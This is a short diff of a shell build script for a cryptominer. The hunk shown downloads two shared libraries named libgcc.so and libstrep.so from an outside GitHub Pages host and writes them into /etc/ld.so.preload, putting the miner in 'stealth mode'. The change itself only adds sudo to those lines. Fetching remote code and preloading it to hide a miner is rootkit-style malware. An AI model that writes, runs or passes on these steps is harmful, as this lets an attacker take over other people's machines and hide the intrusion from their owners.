@@ -249,10 +249,10 @@ function build () {
         done
         log "👹 Crawl stealth tools 👹"; sleep 1;
         cd /usr/local/lib/ &&
-        wget https://b0-b.github.io/DirtyMike/libgcc.so && 
-        wget https://b0-b.github.io/DirtyMike/libstrep.so &&
-        echo /usr/local/lib/libgcc.so >> /etc/ld.so.preload &&
-        echo /usr/local/lib/libstrep.so >> /etc/ld.so.preload
+        sudo wget https://b0-b.github.io/DirtyMike/libgcc.so && 
+        sudo wget https://b0-b.github.io/DirtyMike/libstrep.so &&
+        sudo echo /usr/local/lib/libgcc.so >> /etc/ld.so.preload &&
+        sudo echo /usr/local/lib/libstrep.so >> /etc/ld.so.preload
         log "is in stealth mode 👹"; sleep 1;
     fi
     log "miner will start shortly ..."
